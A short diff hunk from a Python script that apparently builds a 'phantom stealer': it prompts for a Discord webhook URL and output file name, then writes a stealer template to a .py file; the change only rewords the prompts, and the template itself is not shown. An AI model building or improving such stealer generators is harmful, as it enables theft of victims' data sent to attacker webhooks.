@@ -241,8 +241,8 @@ if __name__ == "__main__":
     except: pass'''
 
 print(banner)
-webhookurlinput = input(f"{Fore.MAGENTA}Enter your Discord Webhook URL >> ")
-filenameinput = input(f"{Fore.MAGENTA}Enter Output File's Name >> ")
+webhookurlinput = input(f"{Fore.MAGENTA}Enter your Discord Webhook URL (Full URL) >> ")
+filenameinput = input(f"{Fore.MAGENTA}Enter Output File's Name (Include .py at the end) >> ")
 print(f"{Fore.WHITE}Writing to file..")
 with open(filenameinput, "w", encoding="utf-8") as f:
     f.write(phantomstealertemplate)
